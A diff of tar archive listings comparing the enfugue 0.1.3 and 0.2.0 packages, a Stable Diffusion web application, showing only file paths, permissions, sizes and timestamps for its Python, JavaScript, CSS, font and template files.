--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     3258 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/controller/system/01-settings.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     4587 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/controller/system/02-users.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     8166 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/controller/system/03-installation.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     2601 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/controller/system/04-logs.mjs
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.841198 enfugue-0.1.3/enfugue/static/js/controller/toolbar/
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      470 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/controller/toolbar/01-load-image.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      317 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/controller/toolbar/02-draw-scribble.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      263 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/controller/toolbar/03-region-prompt.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      670 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/enfugue.mjs
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.841198 enfugue-0.1.3/enfugue/static/js/graphics/
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      567 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/graphics/colors.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     4622 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/graphics/geometry.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     1869 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/graphics/paths.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     2942 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/graphics/spline.mjs
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.841198 enfugue-0.1.3/enfugue/static/js/lang/
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      203 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/lang/en.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      256 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/lang/index.mjs
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.841198 enfugue-0.1.3/enfugue/static/js/model/
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     1009 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/model/enfugue.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     5772 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/model/index.mjs
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.841198 enfugue-0.1.3/enfugue/static/js/view/
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     3767 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/view/base.mjs
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.841198 enfugue-0.1.3/enfugue/static/js/view/forms/
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     7044 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/view/forms/base.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     1456 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/view/forms/classic.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      502 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/view/forms/confirm.mjs
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.841198 enfugue-0.1.3/enfugue/static/js/view/forms/input/
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     3301 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/view/forms/input/base.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      472 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/view/forms/input/bool.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     5969 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/view/forms/input/color.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)    11336 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/view/forms/input/enumerable.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      611 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/view/forms/input/file.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      450 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/view/forms/input/misc.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     2928 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/view/forms/input/numeric.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     3845 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/view/forms/input/parent.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      724 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/view/forms/input/string.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     1065 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/view/forms/input.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     9227 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/view/image.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     3631 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/view/menu.mjs
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.841198 enfugue-0.1.3/enfugue/static/js/view/nodes/
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)    12845 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/view/nodes/base.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     3427 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/view/nodes/decorations.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     9870 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/view/nodes/editor.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)    22154 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/view/nodes/image-editor.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     3459 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/view/nodes/windows.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     1512 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/view/notifications.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     4415 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/view/scribble.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     3295 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/view/status.mjs
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)    10912 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/static/js/view/table.mjs
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.841198 enfugue-0.1.3/enfugue/util/
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      275 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/util/__init__.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     1457 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/util/browser.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     1802 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/util/downloads.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      989 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/util/gpu.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     3975 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/util/gputil.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     5992 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/util/images.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     4632 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/util/installation.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)       76 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/util/log.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     8149 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/util/security.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     1203 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/util/signature.py
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     1768 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/util/tokens.py
--rw-------   0 benjamin  (1000) benjamin  (1000)        5 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue/version.txt
-drwxrwxr-x   0 benjamin  (1000) benjamin  (1000)        0 2023-07-06 03:42:40.829199 enfugue-0.1.3/enfugue.egg-info/
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)      202 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue.egg-info/PKG-INFO
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     7811 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue.egg-info/SOURCES.txt
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)        1 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue.egg-info/dependency_links.txt
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)       50 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue.egg-info/entry_points.txt
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)     1106 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue.egg-info/requires.txt
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)        8 2023-07-06 03:42:40.000000 enfugue-0.1.3/enfugue.egg-info/top_level.txt
--rw-rw-r--   0 benjamin  (1000) benjamin  (1000)       38 2023-07-06 03:42:40.845198 enfugue-0.1.3/setup.cfg
--rw-------   0 benjamin  (1000) benjamin  (1000)     2929 2023-07-06 03:42:40.000000 enfugue-0.1.3/setup.py
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.708587 enfugue-0.2.0/
+-rw-rw-rw-   0        0        0      211 2023-07-29 19:49:57.708587 enfugue-0.2.0/PKG-INFO
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.491053 enfugue-0.2.0/enfugue/
+-rw-rw-rw-   0        0        0        0 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/__init__.py
+-rw-rw-rw-   0        0        0     4594 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/__main__.py
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.519052 enfugue-0.2.0/enfugue/api/
+-rw-rw-rw-   0        0        0      314 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/api/__init__.py
+-rw-rw-rw-   0        0        0     2148 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/api/config.py
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.525081 enfugue-0.2.0/enfugue/api/controller/
+-rw-rw-rw-   0        0        0      690 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/api/controller/__init__.py
+-rw-rw-rw-   0        0        0     1345 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/api/controller/base.py
+-rw-rw-rw-   0        0        0     3864 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/api/controller/downloads.py
+-rw-rw-rw-   0        0        0    12497 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/api/controller/invocation.py
+-rw-rw-rw-   0        0        0    24381 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/api/controller/models.py
+-rw-rw-rw-   0        0        0    18584 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/api/controller/system.py
+-rw-rw-rw-   0        0        0     8365 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/api/downloads.py
+-rw-rw-rw-   0        0        0     8925 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/api/invocations.py
+-rw-rw-rw-   0        0        0    20642 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/api/manager.py
+-rw-rw-rw-   0        0        0    17214 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/api/server.py
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.527077 enfugue-0.2.0/enfugue/client/
+-rw-rw-rw-   0        0        0       88 2023-07-29 19:49:55.000000 enfugue-0.2.0/enfugue/client/__init__.py
+-rw-rw-rw-   0        0        0    10690 2023-07-29 19:49:55.000000 enfugue-0.2.0/enfugue/client/client.py
+-rw-rw-rw-   0        0        0     2659 2023-07-29 19:49:55.000000 enfugue-0.2.0/enfugue/client/invocation.py
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.532080 enfugue-0.2.0/enfugue/config/
+-rw-rw-rw-   0        0        0     3002 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/config/cms-context.yml
+-rw-rw-rw-   0        0        0       75 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/config/database.yml
+-rw-rw-rw-   0        0        0      170 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/config/enfugue.yml
+-rw-rw-rw-   0        0        0      119 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/config/logging.yml
+-rw-rw-rw-   0        0        0     2312 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/config/server.yml
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.535054 enfugue-0.2.0/enfugue/database/
+-rw-rw-rw-   0        0        0     1109 2023-07-29 19:49:55.000000 enfugue-0.2.0/enfugue/database/__init__.py
+-rw-rw-rw-   0        0        0      130 2023-07-29 19:49:55.000000 enfugue-0.2.0/enfugue/database/base.py
+-rw-rw-rw-   0        0        0      355 2023-07-29 19:49:55.000000 enfugue-0.2.0/enfugue/database/config.py
+-rw-rw-rw-   0        0        0      814 2023-07-29 19:49:55.000000 enfugue-0.2.0/enfugue/database/invocations.py
+-rw-rw-rw-   0        0        0     4048 2023-07-29 19:49:55.000000 enfugue-0.2.0/enfugue/database/models.py
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.543053 enfugue-0.2.0/enfugue/diffusion/
+-rw-rw-rw-   0        0        0        0 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/diffusion/__init__.py
+-rw-rw-rw-   0        0        0     2416 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/diffusion/constants.py
+-rw-rw-rw-   0        0        0    10640 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/diffusion/engine.py
+-rw-rw-rw-   0        0        0   121725 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/diffusion/manager.py
+-rw-rw-rw-   0        0        0    92000 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/diffusion/pipeline.py
+-rw-rw-rw-   0        0        0    73067 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/diffusion/plan.py
+-rw-rw-rw-   0        0        0    15662 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/diffusion/process.py
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.546056 enfugue-0.2.0/enfugue/diffusion/rt/
+-rw-rw-rw-   0        0        0      317 2023-07-29 19:49:55.000000 enfugue-0.2.0/enfugue/diffusion/rt/__init__.py
+-rw-rw-rw-   0        0        0    12332 2023-07-29 19:49:55.000000 enfugue-0.2.0/enfugue/diffusion/rt/engine.py
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.552572 enfugue-0.2.0/enfugue/diffusion/rt/model/
+-rw-rw-rw-   0        0        0      465 2023-07-29 19:49:55.000000 enfugue-0.2.0/enfugue/diffusion/rt/model/__init__.py
+-rw-rw-rw-   0        0        0     5624 2023-07-29 19:49:55.000000 enfugue-0.2.0/enfugue/diffusion/rt/model/base.py
+-rw-rw-rw-   0        0        0     3082 2023-07-29 19:49:55.000000 enfugue-0.2.0/enfugue/diffusion/rt/model/clip.py
+-rw-rw-rw-   0        0        0    13230 2023-07-29 19:49:55.000000 enfugue-0.2.0/enfugue/diffusion/rt/model/controlledunet.py
+-rw-rw-rw-   0        0        0     7777 2023-07-29 19:49:55.000000 enfugue-0.2.0/enfugue/diffusion/rt/model/controlnet.py
+-rw-rw-rw-   0        0        0     3756 2023-07-29 19:49:55.000000 enfugue-0.2.0/enfugue/diffusion/rt/model/unet.py
+-rw-rw-rw-   0        0        0     2552 2023-07-29 19:49:55.000000 enfugue-0.2.0/enfugue/diffusion/rt/model/vae.py
+-rw-rw-rw-   0        0        0     2671 2023-07-29 19:49:55.000000 enfugue-0.2.0/enfugue/diffusion/rt/optimizer.py
+-rw-rw-rw-   0        0        0    18496 2023-07-29 19:49:55.000000 enfugue-0.2.0/enfugue/diffusion/rt/pipeline.py
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.555606 enfugue-0.2.0/enfugue/diffusion/support/
+-rw-rw-rw-   0        0        0      462 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/diffusion/support/__init__.py
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.557606 enfugue-0.2.0/enfugue/diffusion/support/depth/
+-rw-rw-rw-   0        0        0      134 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/diffusion/support/depth/__init__.py
+-rw-rw-rw-   0        0        0     2824 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/diffusion/support/depth/detect.py
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.559571 enfugue-0.2.0/enfugue/diffusion/support/edge/
+-rw-rw-rw-   0        0        0      130 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/diffusion/support/edge/__init__.py
+-rw-rw-rw-   0        0        0     1643 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/diffusion/support/edge/detect.py
+-rw-rw-rw-   0        0        0     6202 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/diffusion/support/edge/hed.py
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.561575 enfugue-0.2.0/enfugue/diffusion/support/edge/pidi/
+-rw-rw-rw-   0        0        0     3432 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/diffusion/support/edge/pidi/__init__.py
+-rw-rw-rw-   0        0        0    21660 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/diffusion/support/edge/pidi/model.py
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.565595 enfugue-0.2.0/enfugue/diffusion/support/line/
+-rw-rw-rw-   0        0        0      130 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/diffusion/support/line/__init__.py
+-rw-rw-rw-   0        0        0     8279 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/diffusion/support/line/anime.py
+-rw-rw-rw-   0        0        0     5855 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/diffusion/support/line/art.py
+-rw-rw-rw-   0        0        0     2589 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/diffusion/support/line/detect.py
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.567594 enfugue-0.2.0/enfugue/diffusion/support/line/mlsd/
+-rw-rw-rw-   0        0        0      215 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/diffusion/support/line/mlsd/__init__.py
+-rw-rw-rw-   0        0        0     9428 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/diffusion/support/line/mlsd/model.py
+-rw-rw-rw-   0        0        0    24370 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/diffusion/support/line/mlsd/util.py
+-rw-rw-rw-   0        0        0      877 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/diffusion/support/model.py
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.574571 enfugue-0.2.0/enfugue/diffusion/support/pose/
+-rw-rw-rw-   0        0        0      130 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/diffusion/support/pose/__init__.py
+-rw-rw-rw-   0        0        0    14013 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/diffusion/support/pose/body.py
+-rw-rw-rw-   0        0        0      726 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/diffusion/support/pose/detect.py
+-rw-rw-rw-   0        0        0    12600 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/diffusion/support/pose/face.py
+-rw-rw-rw-   0        0        0     3407 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/diffusion/support/pose/hand.py
+-rw-rw-rw-   0        0        0     9882 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/diffusion/support/pose/helper.py
+-rw-rw-rw-   0        0        0     8867 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/diffusion/support/pose/model.py
+-rw-rw-rw-   0        0        0    14359 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/diffusion/support/pose/util.py
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.576571 enfugue-0.2.0/enfugue/diffusion/support/upscale/
+-rw-rw-rw-   0        0        0      123 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/diffusion/support/upscale/__init__.py
+-rw-rw-rw-   0        0        0     6728 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/diffusion/support/upscale/gfpganer.py
+-rw-rw-rw-   0        0        0     4255 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/diffusion/support/upscale/upscaler.py
+-rw-rw-rw-   0        0        0     1762 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/diffusion/support/util.py
+-rw-rw-rw-   0        0        0      860 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/diffusion/support/vision.py
+-rw-rw-rw-   0        0        0    11215 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/diffusion/util.py
+-rw-rw-rw-   0        0        0     1276 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/enfugue.py
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.578574 enfugue-0.2.0/enfugue/interface/
+-rw-rw-rw-   0        0        0    13011 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/interface/__init__.py
+-rw-rw-rw-   0        0        0     4337 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/interface/helpers.py
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.580574 enfugue-0.2.0/enfugue/partner/
+-rw-rw-rw-   0        0        0       38 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/partner/__init__.py
+-rw-rw-rw-   0        0        0     4686 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/partner/civitai.py
+-rw-rw-rw-   0        0        0     1925 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/server.py
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.478503 enfugue-0.2.0/enfugue/static/
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.588572 enfugue-0.2.0/enfugue/static/css/
+-rw-rw-rw-   0        0        0      773 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/css/01-reset.min.css
+-rw-rw-rw-   0        0        0      497 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/css/02-variables.min.css
+-rw-rw-rw-   0        0        0      279 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/css/03-fonts.min.css
+-rw-rw-rw-   0        0        0    13218 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/css/04-base.min.css
+-rw-rw-rw-   0        0        0     7915 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/css/05-common.min.css
+-rw-rw-rw-   0        0        0      987 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/css/06-header.min.css
+-rw-rw-rw-   0        0        0     4198 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/css/07-main.min.css
+-rw-rw-rw-   0        0        0    18813 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/css/08-enfugue.min.css
+-rw-rw-rw-   0        0        0    20348 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/css/09-enfugue-nodes.min.css
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.474526 enfugue-0.2.0/enfugue/static/css/vendor/
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.591599 enfugue-0.2.0/enfugue/static/css/vendor/fa/
+-rw-rw-rw-   0        0        0    18620 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/css/vendor/fa/brands.min.css
+-rw-rw-rw-   0        0        0    80651 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/css/vendor/fa/fontawesome.min.css
+-rw-rw-rw-   0        0        0      606 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/css/vendor/fa/regular.min.css
+-rw-rw-rw-   0        0        0      598 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/css/vendor/fa/solid.min.css
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.475527 enfugue-0.2.0/enfugue/static/fonts/
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.475527 enfugue-0.2.0/enfugue/static/fonts/vendor/
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.598570 enfugue-0.2.0/enfugue/static/fonts/vendor/fa/
+-rw-rw-rw-   0        0        0   186112 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/fonts/vendor/fa/fa-brands-400.ttf
+-rw-rw-rw-   0        0        0   107460 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/fonts/vendor/fa/fa-brands-400.woff2
+-rw-rw-rw-   0        0        0    62048 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/fonts/vendor/fa/fa-regular-400.ttf
+-rw-rw-rw-   0        0        0    25096 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/fonts/vendor/fa/fa-regular-400.woff2
+-rw-rw-rw-   0        0        0   397728 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/fonts/vendor/fa/fa-solid-900.ttf
+-rw-rw-rw-   0        0        0   150472 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/fonts/vendor/fa/fa-solid-900.woff2
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.599570 enfugue-0.2.0/enfugue/static/html/
+-rw-rw-rw-   0        0        0      165 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/html/base.html.j2
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.600570 enfugue-0.2.0/enfugue/static/html/body/
+-rw-rw-rw-   0        0        0      187 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/html/body/body-base.html.j2
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.605572 enfugue-0.2.0/enfugue/static/html/body/content/
+-rw-rw-rw-   0        0        0      379 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/html/body/content/content-admin.html.j2
+-rw-rw-rw-   0        0        0      349 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/html/body/content/content-application.html.j2
+-rw-rw-rw-   0        0        0      122 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/html/body/content/content-error.html.j2
+-rw-rw-rw-   0        0        0      297 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/html/body/content/content-external.html.j2
+-rw-rw-rw-   0        0        0      876 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/html/body/content/content-login.html.j2
+-rw-rw-rw-   0        0        0      166 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/html/body/content/content-template.html.j2
+-rw-rw-rw-   0        0        0      399 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/html/body/external-base.html.j2
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.607574 enfugue-0.2.0/enfugue/static/html/body/footer/
+-rw-rw-rw-   0        0        0       55 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/html/body/footer/footer-base.html.j2
+-rw-rw-rw-   0        0        0      759 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/html/body/footer/footer.html.j2
+drwxrwxrwx   0        0        0        0 2023-07-29 19:49:57.609573 enfugue-0.2.0/enfugue/static/html/body/header/
+-rw-rw-rw-   0        0        0       55 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/html/body/header/header-base.html.j2
+-rw-rw-rw-   0        0        0      140 2023-07-29 19:49:56.000000 enfugue-0.2.0/enfugue/static/html/body/header/header.html.j2
